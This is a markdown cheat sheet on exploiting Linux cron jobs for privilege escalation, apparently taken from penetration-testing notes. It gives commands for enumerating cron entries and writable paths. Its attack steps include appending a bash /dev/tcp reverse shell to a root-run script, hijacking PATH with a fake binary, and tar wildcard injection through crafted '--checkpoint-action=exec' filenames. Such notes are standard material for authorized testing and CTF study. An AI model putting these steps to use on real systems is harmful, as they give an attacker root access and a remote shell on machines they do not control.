# Linux Privilege Escalation – Cron Jobs

## Purpose

This file provides a structured workflow for identifying and exploiting cron jobs for privilege escalation.

Core rules:

* Cron jobs often run as root
* Writable scripts = instant escalation
* PATH issues can lead to command hijacking
* Always check execution frequency

---

## 0. What Are Cron Jobs?

Scheduled tasks executed automatically.

Common locations:

* /etc/crontab
* /etc/cron.*
* user crontabs

---

## 1. Identify Cron Jobs (CRITICAL FIRST STEP)

```bash
cat /etc/crontab
```

```bash
ls -la /etc/cron.*
```

```bash
crontab -l
```

---

## 2. Check Running Processes

```bash
ps aux | grep cron
```

---

## 3. Analyze Cron Job Entries

Example:

```text
* * * * * root /usr/local/bin/script.sh
```

Breakdown:

* schedule
* user (root = high value)
* command

---

## 4. Check Script Permissions (CRITICAL)

```bash
ls -la /usr/local/bin/script.sh
```

If writable:
→ direct privilege escalation

---

## 5. Exploit Writable Script

Modify script:

```bash
echo "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" >> script.sh
```

Wait for execution:
→ reverse shell as root

---

## 6. PATH Hijacking (HIGH VALUE)

If cron uses:

```text
backup.sh
```

Instead of full path:

Check PATH:

```bash
echo $PATH
```

Create malicious binary:

```bash
echo "/bin/bash" > backup.sh
chmod +x backup.sh
```

Place in writable PATH directory.

---

## 7. Wildcard Injection

If cron uses:

```bash
tar *
```

Exploit:

```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=/bin/bash"
```

---

## 8. Check Writable Directories

```bash
find / -writable -type d 2>/dev/null
```

Look for:

* script locations
* execution paths

---

## 9. Check Logs

```bash
grep CRON /var/log/syslog
```

---

## 10. Timing Awareness

Check:

* execution frequency

Fast jobs (every minute):
→ quick exploitation

---

## 11. Common Targets

Look for:

* backup scripts
* cleanup scripts
* custom scripts in /opt

---

## 12. If Script Not Writable

Try:

* PATH hijack
* file replacement
* symlink attack

---

## 13. If Stuck

RESET:

* re-check cron entries
* verify permissions
* test PATH
* check wildcards

---

## 14. Mental Model

* Cron = automated execution
* Writable script = control
* Execution = root shell

---

## 15. Golden Rules

* Always check /etc/crontab
* Always check script permissions
* Always look for root jobs
* Always test PATH hijacking
